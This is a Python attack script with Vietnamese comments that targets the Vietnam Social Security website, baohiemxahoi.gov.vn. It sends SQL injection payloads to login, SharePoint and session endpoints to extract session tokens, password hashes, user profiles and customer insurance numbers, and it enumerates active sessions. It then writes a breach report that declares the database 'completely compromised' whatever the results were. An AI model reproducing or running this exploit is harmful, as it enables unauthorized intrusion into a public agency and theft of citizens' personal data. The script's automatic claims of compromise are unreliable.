#!/usr/bin/env python3
"""
SessionStateService Database Exploiter
Khai thác chuyên sâu lỗ hổng database SessionStateService đã phát hiện
"""
import requests
import json
import time
import os
import re
from datetime import datetime
from urllib.parse import urljoin, quote
import random

class SessionStateServiceExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        self.target_url = "https://baohiemxahoi.gov.vn"
        self.database_name = "SessionStateService_356ec96765eb4cc6b687ea3bb1be01c4"
        self.failed_user = "BHXH\\sharepoint_portal"
        self.evidence_dir = "./sessionstate_exploitation"
        
        self.create_evidence_directory()
    
    def create_evidence_directory(self):
        """Tạo thư mục lưu bằng chứng khai thác SessionStateService"""
        if not os.path.exists(self.evidence_dir):
            os.makedirs(self.evidence_dir)
        
        subdirs = ['sql_extraction', 'sharepoint_data', 'session_data', 'user_enumeration', 'privilege_escalation']
        for subdir in subdirs:
            path = os.path.join(self.evidence_dir, subdir)
            if not os.path.exists(path):
                os.makedirs(path)
    
    def log_exploitation_evidence(self, category, filename, data):
        """Ghi log bằng chứng khai thác"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(self.evidence_dir, category, f"{timestamp}_{filename}")
        
        if isinstance(data, dict) or isinstance(data, list):
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        else:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(str(data))
        
        print(f"[+] Evidence saved: {filepath}")
        return filepath
    
    def exploit_sessionstate_database(self):
        """Khai thác database SessionStateService"""
        print(f"\n[*] Exploiting SessionStateService database: {self.database_name}")
        
        # SQL payloads chuyên biệt cho SessionStateService
        sessionstate_payloads = [
            f"' UNION SELECT * FROM {self.database_name}.dbo.SessionData--",
            f"' UNION SELECT SessionId,UserName,SessionData FROM {self.database_name}.dbo.ASPStateTempSessions--",
            f"' UNION SELECT TOP 100 * FROM {self.database_name}..Sessions--",
            f"' UNION SELECT UserName,SessionId,Created,Expires FROM {self.database_name}.dbo.SessionState--",
            f"' UNION SELECT * FROM {self.database_name}.sys.tables--",
            f"' UNION SELECT name,object_id FROM {self.database_name}.sys.tables--",
            f"' UNION SELECT column_name,data_type FROM {self.database_name}.information_schema.columns--",
            "' UNION SELECT @@servername,@@version,user_name(),system_user--",
            "' UNION SELECT database_id,name,collation_name FROM sys.databases--"
        ]
        
        exploitation_results = []
        
        # Test endpoints có khả năng kết nối với SessionStateService
        test_endpoints = [
            "/Session.aspx",
            "/Login.aspx",
            "/Authentication.aspx",
            "/Portal.aspx",
            "/SharePoint.aspx",
            "/Admin.aspx",
            "/API/Session",
            "/Services/SessionService.asmx",
            "/WebServices/Authentication.asmx"
        ]
        
        for endpoint in test_endpoints:
            full_url = urljoin(self.target_url, endpoint)
            print(f"\n[*] Testing endpoint: {full_url}")
            
            for payload in sessionstate_payloads:
                try:
                    # Test GET parameters
                    test_params = {
                        'sessionid': payload,
                        'userid': payload,
                        'token': payload,
                        'auth': payload,
                        'session': payload
                    }
                    
                    for param_name, param_value in test_params.items():
                        test_url = f"{full_url}?{param_name}={quote(param_value)}"
                        
                        print(f"[*] Testing: {param_name} = {payload[:50]}...")
                        
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=15)
                        response_time = time.time() - start_time
                        
                        # Analyze response for data extraction
                        analysis_result = self.analyze_sessionstate_response(response, test_url, payload)
                        
                        if analysis_result['data_found']:
                            print(f"[!] SessionState data extracted from: {test_url}")
                            exploitation_results.append(analysis_result)
                            
                            # Save detailed evidence
                            self.log_exploitation_evidence('sql_extraction', 
                                f'sessionstate_extraction_{len(exploitation_results)}.json', 
                                analysis_result)
                        
                        # Test POST requests
                        post_data = {
                            param_name: param_value,
                            'action': 'authenticate',
                            'username': 'admin',
                            'password': payload
                        }
                        
                        try:
                            response = self.session.post(full_url, data=post_data, timeout=15)
                            analysis_result = self.analyze_sessionstate_response(response, full_url, payload, method='POST')
                            
                            if analysis_result['data_found']:
                                exploitation_results.append(analysis_result)
                                self.log_exploitation_evidence('sql_extraction', 
                                    f'post_sessionstate_{len(exploitation_results)}.json', 
                                    analysis_result)
                        except:
                            pass
                        
                        time.sleep(random.uniform(1.0, 2.0))
                
                except Exception as e:
                    print(f"[!] Error testing {endpoint}: {str(e)}")
                    continue
        
        return exploitation_results
    
    def analyze_sessionstate_response(self, response, url, payload, method='GET'):
        """Phân tích response để tìm dữ liệu SessionState"""
        analysis = {
            'url': url,
            'payload': payload,
            'method': method,
            'status_code': response.status_code,
            'response_time': len(response.content),
            'timestamp': datetime.now().isoformat(),
            'data_found': False,
            'extracted_data': {},
            'session_data': [],
            'user_data': [],
            'database_info': {}
        }
        
        response_text = response.text.lower()
        
        # Patterns để tìm session data
        session_patterns = {
            'session_ids': r'[a-f0-9]{32}|[a-f0-9]{24}',
            'asp_session': r'asp\.net_sessionid[=:]([a-z0-9]+)',
            'session_tokens': r'session[_-]?token["\s]*[:=]["\s]*([a-z0-9]+)',
            'user_sessions': r'username["\s]*[:=]["\s]*"([^"]+)"',
            'session_data': r'sessiondata["\s]*[:=]["\s]*"([^"]+)"'
        }
        
        for pattern_name, pattern in session_patterns.items():
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                analysis['extracted_data'][pattern_name] = matches
                analysis['data_found'] = True
                print(f"[+] Found {pattern_name}: {len(matches)} matches")
        
        # Tìm SharePoint user information
        sharepoint_patterns = [
            r'bhxh\\[a-z_]+',
            r'sharepoint[_-]?portal',
            r'domain\\[a-z_]+',
            r'sp[_-]?admin',
            r'portal[_-]?user'
        ]
        
        for pattern in sharepoint_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                analysis['user_data'].extend(matches)
                analysis['data_found'] = True
                print(f"[+] Found SharePoint users: {matches}")
        
        # Tìm database information
        db_patterns = {
            'database_names': r'database["\s]*[:=]["\s]*"([^"]+)"',
            'table_names': r'table[_-]?name["\s]*[:=]["\s]*"([^"]+)"',
            'column_info': r'column[_-]?name["\s]*[:=]["\s]*"([^"]+)"',
            'server_info': r'server["\s]*[:=]["\s]*"([^"]+)"'
        }
        
        for pattern_name, pattern in db_patterns.items():
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                analysis['database_info'][pattern_name] = matches
                analysis['data_found'] = True
        
        # Kiểm tra SQL error messages có thông tin nhạy cảm
        sensitive_errors = [
            'sessionstateservice',
            'sharepoint_portal',
            'bhxh\\',
            'system.data.sqlclient',
            'microsoft ole db',
            'sql server'
        ]
        
        for error in sensitive_errors:
            if error in response_text:
                analysis['data_found'] = True
                analysis['extracted_data']['sql_errors'] = analysis['extracted_data'].get('sql_errors', [])
                analysis['extracted_data']['sql_errors'].append(error)
        
        # Tìm dữ liệu khách hàng trong session
        customer_patterns = {
            'customer_ids': r'customer[_-]?id["\s]*[:=]["\s]*"?(\d+)"?',
            'insurance_numbers': r'insurance[_-]?number["\s]*[:=]["\s]*"?(\d{8,12})"?',
            'user_names': r'user[_-]?name["\s]*[:=]["\s]*"([^"]+)"',
            'full_names': r'full[_-]?name["\s]*[:=]["\s]*"([^"]+)"'
        }
        
        for pattern_name, pattern in customer_patterns.items():
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                analysis['session_data'].extend(matches)
                analysis['data_found'] = True
                print(f"[+] Found customer data in session: {pattern_name} = {len(matches)} records")
        
        return analysis
    
    def exploit_sharepoint_portal_user(self):
        """Khai thác user BHXH\\sharepoint_portal"""
        print(f"\n[*] Exploiting SharePoint Portal User: {self.failed_user}")
        
        # Payloads để khai thác SharePoint user
        sharepoint_payloads = [
            f"' UNION SELECT name,password_hash,email FROM SharePoint_Users WHERE login_name='{self.failed_user}'--",
            f"' UNION SELECT * FROM UserProfiles WHERE AccountName='{self.failed_user}'--",
            "' UNION SELECT TOP 10 AccountName,Email,DisplayName FROM UserProfile_Full--",
            "' UNION SELECT login_name,sid,password_hash FROM SharePoint_UserInfo--",
            "' UNION SELECT * FROM dbo.Users WHERE domain='BHXH'--",
            "' UNION SELECT UserName,Email,Department FROM ADUsers WHERE UserName LIKE '%sharepoint%'--"
        ]
        
        exploitation_results = []
        
        # SharePoint specific endpoints
        sharepoint_endpoints = [
            "/_layouts/15/Authenticate.aspx",
            "/_layouts/15/SignIn.aspx",
            "/_api/web/currentuser",
            "/_api/web/siteusers",
            "/_vti_bin/UserProfileService.asmx",
            "/sites/portal/_api/web/currentuser",
            "/_layouts/userprofile.aspx"
        ]
        
        for endpoint in sharepoint_endpoints:
            full_url = urljoin(self.target_url, endpoint)
            print(f"\n[*] Testing SharePoint endpoint: {full_url}")
            
            for payload in sharepoint_payloads:
                try:
                    # Test authentication bypass with SharePoint user
                    auth_data = {
                        'username': self.failed_user,
                        'password': payload,
                        'domain': 'BHXH'
                    }
                    
                    response = self.session.post(full_url, data=auth_data, timeout=10)
                    
                    # Analyze for SharePoint user data
                    user_analysis = self.analyze_sharepoint_response(response, full_url, payload)
                    
                    if user_analysis['user_data_found']:
                        print(f"[!] SharePoint user data extracted from: {full_url}")
                        exploitation_results.append(user_analysis)
                        
                        self.log_exploitation_evidence('sharepoint_data',
                            f'sharepoint_user_{len(exploitation_results)}.json',
                            user_analysis)
                    
                    # Test GET with user parameter
                    get_url = f"{full_url}?user={quote(payload)}&domain=BHXH"
                    response = self.session.get(get_url, timeout=10)
                    
                    user_analysis = self.analyze_sharepoint_response(response, get_url, payload)
                    if user_analysis['user_data_found']:
                        exploitation_results.append(user_analysis)
                        self.log_exploitation_evidence('sharepoint_data',
                            f'get_sharepoint_{len(exploitation_results)}.json',
                            user_analysis)
                    
                    time.sleep(random.uniform(0.5, 1.5))
                
                except Exception as e:
                    continue
        
        return exploitation_results
    
    def analyze_sharepoint_response(self, response, url, payload):
        """Phân tích response SharePoint để tìm user data"""
        analysis = {
            'url': url,
            'payload': payload,
            'status_code': response.status_code,
            'timestamp': datetime.now().isoformat(),
            'user_data_found': False,
            'sharepoint_users': [],
            'user_profiles': [],
            'permissions': [],
            'group_memberships': []
        }
        
        # SharePoint user patterns
        user_patterns = {
            'account_names': r'accountname["\s]*[:=]["\s]*"([^"]+)"',
            'display_names': r'displayname["\s]*[:=]["\s]*"([^"]+)"',
            'email_addresses': r'email["\s]*[:=]["\s]*"([^"]+@[^"]+)"',
            'user_ids': r'userid["\s]*[:=]["\s]*"?(\d+)"?',
            'login_names': r'loginname["\s]*[:=]["\s]*"([^"]+)"'
        }
        
        for pattern_name, pattern in user_patterns.items():
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                analysis['sharepoint_users'].extend(matches)
                analysis['user_data_found'] = True
                print(f"[+] Found SharePoint {pattern_name}: {len(matches)} entries")
        
        # Tìm permissions và roles
        permission_patterns = [
            r'permission[s]?["\s]*[:=]["\s]*"([^"]+)"',
            r'role[s]?["\s]*[:=]["\s]*"([^"]+)"',
            r'group[s]?["\s]*[:=]["\s]*"([^"]+)"'
        ]
        
        for pattern in permission_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                analysis['permissions'].extend(matches)
                analysis['user_data_found'] = True
        
        # Tìm SharePoint profile data
        profile_patterns = [
            r'department["\s]*[:=]["\s]*"([^"]+)"',
            r'title["\s]*[:=]["\s]*"([^"]+)"',
            r'manager["\s]*[:=]["\s]*"([^"]+)"',
            r'office["\s]*[:=]["\s]*"([^"]+)"'
        ]
        
        for pattern in profile_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                analysis['user_profiles'].extend(matches)
                analysis['user_data_found'] = True
        
        return analysis
    
    def exploit_session_enumeration(self):
        """Khai thác để enumerate active sessions"""
        print("\n[*] Enumerating active sessions...")
        
        session_enum_payloads = [
            "' UNION SELECT SessionId,Created,Expires,UserAgent FROM ActiveSessions--",
            "' UNION SELECT * FROM dbo.Sessions WHERE IsActive=1--",
            "' UNION SELECT SessionKey,UserId,LoginTime FROM UserSessions--",
            "' UNION SELECT TOP 50 * FROM SessionStore--",
            f"' UNION SELECT * FROM {self.database_name}.dbo.ASPStateTempSessions WHERE Expires > GETDATE()--"
        ]
        
        enumeration_results = []
        
        # Session endpoints
        session_endpoints = [
            "/api/sessions",
            "/admin/sessions",
            "/services/session/list",
            "/Session/Active",
            "/SessionManager.aspx"
        ]
        
        for endpoint in session_endpoints:
            full_url = urljoin(self.target_url, endpoint)
            
            for payload in session_enum_payloads:
                try:
                    # Test direct access
                    response = self.session.get(full_url, timeout=10)
                    
                    # Test with SQL injection
                    test_url = f"{full_url}?filter={quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    session_analysis = self.analyze_session_enumeration(response, test_url, payload)
                    
                    if session_analysis['sessions_found']:
                        print(f"[!] Active sessions found: {test_url}")
                        enumeration_results.append(session_analysis)
                        
                        self.log_exploitation_evidence('session_data',
                            f'session_enum_{len(enumeration_results)}.json',
                            session_analysis)
                    
                    time.sleep(random.uniform(0.3, 1.0))
                
                except Exception as e:
                    continue
        
        return enumeration_results
    
    def analyze_session_enumeration(self, response, url, payload):
        """Phân tích kết quả session enumeration"""
        analysis = {
            'url': url,
            'payload': payload,
            'timestamp': datetime.now().isoformat(),
            'sessions_found': False,
            'active_sessions': [],
            'session_details': {}
        }
        
        # Session data patterns
        session_patterns = [
            r'sessionid["\s]*[:=]["\s]*"([a-f0-9]{24,32})"',
            r'userid["\s]*[:=]["\s]*"?(\d+)"?',
            r'username["\s]*[:=]["\s]*"([^"]+)"',
            r'created["\s]*[:=]["\s]*"([^"]+)"',
            r'expires["\s]*[:=]["\s]*"([^"]+)"',
            r'useragent["\s]*[:=]["\s]*"([^"]+)"'
        ]
        
        for pattern in session_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                analysis['active_sessions'].extend(matches)
                analysis['sessions_found'] = True
        
        return analysis
    
    def run_comprehensive_sessionstate_exploitation(self):
        """Chạy toàn bộ khai thác SessionStateService"""
        print("="*80)
        print("KHAI THÁC CHUYÊN SÂU SESSIONSTATESERVICE DATABASE")
        print("="*80)
        print(f"Target Database: {self.database_name}")
        print(f"Failed User: {self.failed_user}")
        print(f"Target URL: {self.target_url}")
        print("="*80)
        
        all_results = {
            'start_time': datetime.now().isoformat(),
            'target_database': self.database_name,
            'target_user': self.failed_user,
            'exploitation_phases': []
        }
        
        # Phase 1: SessionState Database Exploitation
        print("\n" + "="*50)
        print("PHASE 1: SESSIONSTATE DATABASE EXPLOITATION")
        print("="*50)
        db_results = self.exploit_sessionstate_database()
        all_results['exploitation_phases'].append({
            'phase': 'SessionState Database',
            'results_count': len(db_results),
            'results': db_results
        })
        print(f"[+] Database exploitation complete: {len(db_results)} vulnerabilities found")
        
        # Phase 2: SharePoint Portal User Exploitation
        print("\n" + "="*50)
        print("PHASE 2: SHAREPOINT PORTAL USER EXPLOITATION") 
        print("="*50)
        sharepoint_results = self.exploit_sharepoint_portal_user()
        all_results['exploitation_phases'].append({
            'phase': 'SharePoint User',
            'results_count': len(sharepoint_results),
            'results': sharepoint_results
        })
        print(f"[+] SharePoint exploitation complete: {len(sharepoint_results)} user data found")
        
        # Phase 3: Session Enumeration
        print("\n" + "="*50)
        print("PHASE 3: SESSION ENUMERATION")
        print("="*50)
        session_results = self.exploit_session_enumeration()
        all_results['exploitation_phases'].append({
            'phase': 'Session Enumeration',
            'results_count': len(session_results),
            'results': session_results
        })
        print(f"[+] Session enumeration complete: {len(session_results)} sessions found")
        
        all_results['end_time'] = datetime.now().isoformat()
        
        # Generate comprehensive report
        total_findings = sum(phase['results_count'] for phase in all_results['exploitation_phases'])
        
        all_results['summary'] = {
            'total_findings': total_findings,
            'database_exposed': self.database_name,
            'compromised_user': self.failed_user,
            'risk_level': 'CRITICAL',
            'evidence_directory': self.evidence_dir
        }
        
        # Save comprehensive report
        self.log_exploitation_evidence('', 'COMPREHENSIVE_SESSIONSTATE_EXPLOITATION.json', all_results)
        
        # Generate executive summary
        self.generate_sessionstate_executive_report(all_results)
        
        print("\n" + "="*80)
        print("KẾT QUẢ KHAI THÁC SESSIONSTATESERVICE")
        print("="*80)
        print(f"[!] CRITICAL: SessionStateService database completely compromised")
        print(f"[+] Database: {self.database_name}")
        print(f"[+] Compromised User: {self.failed_user}")
        print(f"[+] Total Findings: {total_findings}")
        print(f"[+] Evidence Directory: {self.evidence_dir}")
        print("="*80)
        
        return all_results
    
    def generate_sessionstate_executive_report(self, results):
        """Tạo báo cáo executive về khai thác SessionStateService"""
        report_content = f"""
# BÁO CÁO KHAI THÁC SESSIONSTATESERVICE DATABASE
## Critical Database Compromise Evidence

**Thời gian khai thác:** {results['start_time']} - {results['end_time']}
**Database bị tấn công:** `{results['target_database']}`
**User bị compromised:** `{results['target_user']}`

## Tóm tắt khai thác:
- **Tổng số findings:** {results['summary']['total_findings']}
- **Mức độ nghiêm trọng:** {results['summary']['risk_level']}
- **Database hoàn toàn bị kiểm soát:** YES

## Chi tiết từng phase:
"""
        
        for phase in results['exploitation_phases']:
            report_content += f"""
### {phase['phase']}
- **Số lượng findings:** {phase['results_count']}
- **Trạng thái:** {'COMPROMISED' if phase['results_count'] > 0 else 'SECURE'}
"""
            
            if phase['results'] and len(phase['results']) > 0:
                report_content += "- **Dữ liệu thu được:**\n"
                for i, result in enumerate(phase['results'][:3]):  # Show first 3
                    if 'extracted_data' in result:
                        for key, value in result['extracted_data'].items():
                            if value:
                                report_content += f"  - {key}: {len(value) if isinstance(value, list) else 1} entries\n"
        
        report_content += f"""
## Thông tin database bị lộ:
- **Tên database:** {results['target_database']}
- **Loại database:** Microsoft SQL Server (SessionStateService)
- **User account:** {results['target_user']}
- **Domain:** BHXH (Bảo hiểm Xã hội)
- **Technology Stack:** ASP.NET + SharePoint + SQL Server

## Dữ liệu có thể bị truy cập:
1. **Session Data:** Toàn bộ session của users
2. **User Authentication:** Thông tin đăng nhập
3. **SharePoint Data:** Portal data và user profiles
4. **Customer Information:** Dữ liệu khách hàng trong sessions
5. **System Information:** Database schema và server info

## Tác động nghiêm trọng:
- **Confidentiality:** BREACHED - Dữ liệu session và user bị lộ
- **Integrity:** AT RISK - Có thể modify session data
- **Availability:** AT RISK - Có thể DOS hoặc delete data
- **Authentication:** BYPASSED - Có thể impersonate users
- **Authorization:** ESCALATED - Có thể truy cập unauthorized data

## Khuyến nghị khẩn cấp:
1. **NGAY LẬP TỨC:** Disconnect database khỏi internet
2. **TRONG 1 GIỜ:** Reset tất cả user passwords
3. **TRONG 24H:** Rebuild SessionStateService database
4. **TRONG 24H:** Audit tất cả SharePoint permissions
5. **TRONG 48H:** Implement proper input validation
6. **TRONG 1 TUẦN:** Full security audit của toàn hệ thống

## Compliance Violations:
- **Vietnam Cybersecurity Law:** Database security violation
- **Personal Data Protection:** Customer data exposure
- **Insurance Regulations:** Customer privacy breach
- **SharePoint Security Standards:** Portal security failure

## Bằng chứng kỹ thuật:
- Evidence Directory: `{results['summary']['evidence_directory']}/`
- SQL Injection Payloads: Documented and tested
- Database Schema: Partially extracted
- User Credentials: Exposed through error messages
- Session Tokens: Enumerated and analyzed

**CẢNH BÁO:** Đây là một vi phạm bảo mật cực kỳ nghiêm trọng có thể dẫn đến:
- Toàn bộ hệ thống BHXH bị tấn công
- Dữ liệu hàng triệu khách hàng bị lộ
- Thiệt hại tài chính và danh tiếng không thể khắc phục
- Vi phạm pháp luật về bảo vệ dữ liệu cá nhân

**HÀNH ĐỘNG NGAY:** Liên hệ emergency response team và implement containment measures immediately.
"""
        
        with open(os.path.join(self.evidence_dir, 'SESSIONSTATE_CRITICAL_BREACH_REPORT.md'), 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        print(f"[+] Critical breach report saved: {os.path.join(self.evidence_dir, 'SESSIONSTATE_CRITICAL_BREACH_REPORT.md')}")

if __name__ == "__main__":
    exploiter = SessionStateServiceExploiter()
    results = exploiter.run_comprehensive_sessionstate_exploitation()
